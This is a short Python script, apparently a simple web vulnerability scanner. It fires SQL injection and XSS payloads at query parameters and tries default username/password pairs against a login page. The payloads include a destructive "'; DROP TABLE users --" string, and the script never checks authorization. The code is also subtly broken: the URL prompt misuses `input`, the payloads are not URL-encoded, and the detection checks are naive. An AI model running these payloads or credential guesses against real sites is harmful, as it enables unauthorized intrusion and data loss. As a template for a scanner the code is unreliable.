import requests

# Example target URL
url = input('http://example.com')

def check_sql_injection(url):
    payloads = ["' OR 1=1 --", "' OR 'a'='a", "'; DROP TABLE users --"]
    vulnerable = False
    
    for payload in payloads:
        # Assuming target URL has a parameter named 'id'
        test_url = f"{url}/?id={payload}"
        response = requests.get(test_url)
        
        if "SQL syntax" in response.text or "mysql_fetch_array()" in response.text:
            print(f"Potential SQL Injection vulnerability detected with payload: {payload}")
            vulnerable = True
    
    if not vulnerable:
        print("No SQL Injection vulnerability found.")

def check_xss(url):
    payloads = ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(1)">']
    vulnerable = False
    
    for payload in payloads:
        # Assuming target URL has a parameter named 'q'
        test_url = f"{url}/?q={payload}"
        response = requests.get(test_url)
        
        if payload in response.text:
            print(f"Potential XSS vulnerability detected with payload: {payload}")
            vulnerable = True
    
    if not vulnerable:
        print("No XSS vulnerability found.")

def check_insecure_authentication(url):
    # Basic check for insecure authentication mechanisms
    weak_passwords = ['admin:admin', 'root:toor', 'user:password']
    
    for creds in weak_passwords:
        username, password = creds.split(':')
        response = requests.post(f"{url}/login", data={'username': username, 'password': password})
        
        if "Welcome" in response.text:
            print(f"Insecure authentication mechanism detected with credentials: {creds}")
            break
    else:
        print("No insecure authentication vulnerabilities found.")

def main():
    check_sql_injection(url)
    check_xss(url)
    check_insecure_authentication(url)

if __name__ == "__main__":
    main()
